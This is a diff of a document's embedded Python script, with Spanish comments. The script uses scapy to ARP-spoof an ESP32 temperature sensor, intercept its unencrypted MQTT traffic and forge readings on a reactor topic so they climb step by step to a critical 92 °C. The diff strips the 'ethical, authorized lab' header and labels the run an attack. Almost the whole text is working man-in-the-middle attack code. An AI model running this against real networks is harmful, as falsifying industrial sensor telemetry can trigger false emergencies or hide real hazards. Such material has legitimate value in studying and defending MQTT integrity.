@@ -151,138 +151,112 @@ void loop() {
 
 ```
 #!/usr/bin/env python3
-"""
-Demostración ética de integridad en MQTT sin cifrar
-Laboratorio autorizado – Proyecto académico
-"""
-
 from scapy.all import *
 import random, time, os
 from threading import Thread
-from datetime import datetime
 
 # ====================================================
-# CONFIGURACIÓN (ajustar según tu red de laboratorio)
+# CONFIGURACIÓN
 # ====================================================
-IFACE       = "wlp3s0"                  # interfaz Wi-Fi del atacante
-MY_IP       = "XXX.XXX.XXX.XXX"         # IP de tu máquina (broker local)
-MY_MAC      = get_if_hwaddr(IFACE)      # se obtiene automáticamente
-ESP32_IP    = "XXX.XXX.XXX.XXX"         # IP del sensor ESP32
-ESP32_MAC   = "XX:XX:XX:XX:XX:XX"       # MAC del ESP32
-TARGET_TEMP = 92.0                      # valor crítico objetivo
+IFACE       = "XXXX"                    # Interfaz de red del atacante
+MY_IP       = "XX.XX.XXX.XX"            # IP propia (también es el broker MQTT)
+MY_MAC      = get_if_hwaddr(IFACE)      # MAC propia, obtenida automáticamente
+ESP32_IP    = "XX.XX.XX.XX"             # IP del sensor ESP32
+ESP32_MAC   = "XX:XX:XX:XX:XX:XX"       # MAC del ESP32 (obtenida con arp-scan/ettercap)
+CRITICAL    = 92.0                      # Umbral crítico de temperatura a inyectar
 # ====================================================
 
-current_temp = 38.0
-last_update  = 0
-peak_reached = False
+current_temp = 38.0        # Temperatura inicial desde la que comenzamos a escalar
+last_update  = 0           # Control de refresco de pantalla
+threshold    = False       # Indica si ya se alcanzó el valor crítico
 
 # ----------------------------------------------------
-# ARP poisoning continuo (solo hacia el sensor)
+# ARP spoofing continuo dirigido solo al sensor
 # ----------------------------------------------------
 def arp_spoof():
     while True:
+        # Enviamos ARP reply falso: "MY_IP está en mi MAC"
         send(ARP(op=2, pdst=ESP32_IP, psrc=MY_IP, hwdst=ESP32_MAC), verbose=0)
         time.sleep(1.8)
 
 # ----------------------------------------------------
-# Cabecera elegante
-# ----------------------------------------------------
-def print_header():
-    os.system('clear')
-    print("\033[90m┌" + "─" * 68 + "┐\033[0m")
-    print("│ \033[97;44m MQTT INTEGRITY DEMONSTRATION – LIVE MANIPULATION \033[0m │")
-    print("\033[90m└" + "─" * 68 + "┘\033[0m\n")
-
-# ----------------------------------------------------
-# MITM + reescritura de temperatura
+# Función principal de MITM y manipulación de payload
 # ----------------------------------------------------
 def mitm(pkt):
-    global current_temp, last_update, peak_reached
+    global current_temp, last_update, threshold
 
+    # Solo nos interesan paquetes con payload MQTT
     if not pkt.haslayer(Raw):
         return
     payload = pkt[Raw].load
 
     # ------------------------------------------------
-    # Paquetes del sensor → broker (los que modificamos)
+    # Paquetes PUBLISH del ESP32 hacia el broker (los modificamos)
     # ------------------------------------------------
     if (pkt.haslayer(IP) and pkt[IP].src == ESP32_IP and
         pkt.haslayer(TCP) and pkt[TCP].dport == 1883 and
         b'"temp"' in payload):
 
         try:
-            txt = payload.decode()
-            real_temp = float(txt.split('"temp":')[1].split(',')[0])
+            txt = payload.decode()                                   # Payload en texto
+            real_temp = float(txt.split('"temp":')[1].split(',')[0].split('}')[0])
 
-            # escalada progresiva controlada
+            # Escalada progresiva y realista de la temperatura
             current_temp += round(random.uniform(2.1, 4.3), 1)
-            if current_temp > TARGET_TEMP:
-                current_temp = TARGET_TEMP
-                peak_reached = True
+            if current_temp >= CRITICAL:
+                current_temp = CRITICAL
+                threshold = True
+
             forged_temp = round(current_temp, 1)
 
-            # reemplazo del valor real por el falso
+            # Sustituimos el valor real por el falso en el JSON
             forged_txt = txt.replace(f'"temp":{real_temp}', f'"temp":{forged_temp}', 1)
             forged_payload = forged_txt.encode()
 
-            # truco Wi-Fi: usar nuestra propia MAC como destino
+            # Construcción del paquete falsificado
             spoofed = (Ether(src=MY_MAC, dst=MY_MAC) /
                        IP(src=ESP32_IP, dst=MY_IP) /
                        pkt[TCP] /
                        Raw(forged_payload))
 
-            # ajuste de secuencia TCP si cambia la longitud del payload
-            delta = len(forged_payload) - len(payload)
-            if delta:
-                spoofed[TCP].seq += delta
+            # Ajuste de secuencia TCP cuando cambia la longitud del payload
+            if len(forged_payload) != len(payload):
+                spoofed[TCP].seq += len(forged_payload) - len(payload)
 
+            # Envío del paquete modificado
             sendp(spoofed, iface=IFACE, verbose=0)
 
-            # actualización de pantalla cada ~0.9 s o al alcanzar el objetivo
-            if time.time() - last_update > 0.9 or peak_reached:
-                print_header()
-                print(f"  \033[96mTarget Device\033[0m : {ESP32_IP} ({ESP32_MAC})")
-                print(f"  \033[96mMQTT Broker\033[0m   : {MY_IP}:1883")
-                print(f"  \033[96mTopic\033[0m         : planta/reactor1/temperatura")
-                print(f"  \033[96mTimestamp\033[0m     : {datetime.now():%Y-%m-%d %H:%M:%S}\n")
-
-                print(f"  \033[93mOriginal value\033[0m  : {real_temp:6.1f} °C")
-                print(f"  \033[91mInjected value\033[0m  : {forged_temp:6.1f} °C\033[0m")
-
-                ratio   = forged_temp / TARGET_TEMP
-                blocks  = int(50 * ratio)
-                bar     = "█" * blocks + "░" * (50 - blocks)
-                color   = "\033[92m" if forged_temp < 70 else "\033[93m" if forged_temp < 92 else "\033[91m"
-                print(f"\n  Progress → [{color}{bar}\033[0m] {forged_temp:5.1f} / {TARGET_TEMP} °C\n")
-
-                if forged_temp >= TARGET_TEMP:
-                    print("  \033[41;97m CRITICAL THRESHOLD INJECTED SUCCESSFULLY \033[0m")
-                    print("\n  \033[90mLaboratory demonstration completed – integrity compromised.\033[0m")
-                else:
-                    print(f"  \033[90mStatus: Escalating payload… (+{forged_temp-38.0:.1f} °C from baseline)\033[0m")
-
+            # Actualización de pantalla cada ~0.9 s o al alcanzar el objetivo
+            if time.time() - last_update > 0.9 or threshold:
+                os.system('clear')
+                print("\033[90m┌" + "─" * 70 + "┐\033[0m")
+                print("│ \033[97;44m MQTT Integrity Assessment – Controlled Environment \033[0m │")
+                print("\033[90m└" + "─" * 70 + "┘\033[0m")
+                print(f" Sensor         : {ESP32_IP} ({ESP32_MAC})")
+                print(f" MQTT Broker    : {MY_IP}:1883")
+                print(f" Topic          : planta/reactor1/temperatura")
+                print(f" Measured value : {real_temp:6.1f} °C")
+                print(f" Reported value : {forged_temp:6.1f} °C")
+                filled = int(50 * forged_temp / CRITICAL)
+                bar = "█" * filled + "░" * (50 - filled)
+                print(f" Progress       : [{bar}] {forged_temp:5.1f} / {CRITICAL} °C")
                 last_update = time.time()
 
         except:
-            pass
+            pass   # Ignoramos cualquier error de parsing
 
     # ------------------------------------------------
-    # Reenvío de respuestas del broker al sensor
+    # Reenvío transparente de respuestas del broker al sensor
     # ------------------------------------------------
     elif pkt.haslayer(IP) and pkt[IP].dst == ESP32_IP and pkt[TCP].sport == 1883:
         sendp(Ether(src=MY_MAC, dst=MY_MAC) / pkt[IP], iface=IFACE, verbose=0)
 
 # ====================================================
-# INICIO DE LA DEMOSTRACIÓN
+# INICIO DEL ATAQUE / DEMOSTRACIÓN
 # ====================================================
-print_header()
-print("  \033[92m[+] Initializing transparent man-in-the-middle (ethical lab)\033[0m")
-print("  \033[92m[+] ARP cache poisoning in progress\033[0m")
-print("  \033[92m[+] Intercepting and rewriting temperature telemetry\033[0m\n")
-
-Thread(target=arp_spoof, daemon=True).start()
-time.sleep(2.5)
-sniff(iface=IFACE, prn=mitm, filter="tcp port 1883", store=0)
+Thread(target=arp_spoof, daemon=True).start()   # Inicia ARP spoofing en segundo plano
+time.sleep(2)                                   # Pequeña espera para estabilizar ARP
+sniff(iface=IFACE, prn=mitm, filter="tcp port 1883", store=0)  # Captura y procesa tráfico MQTT
 ```
 
 
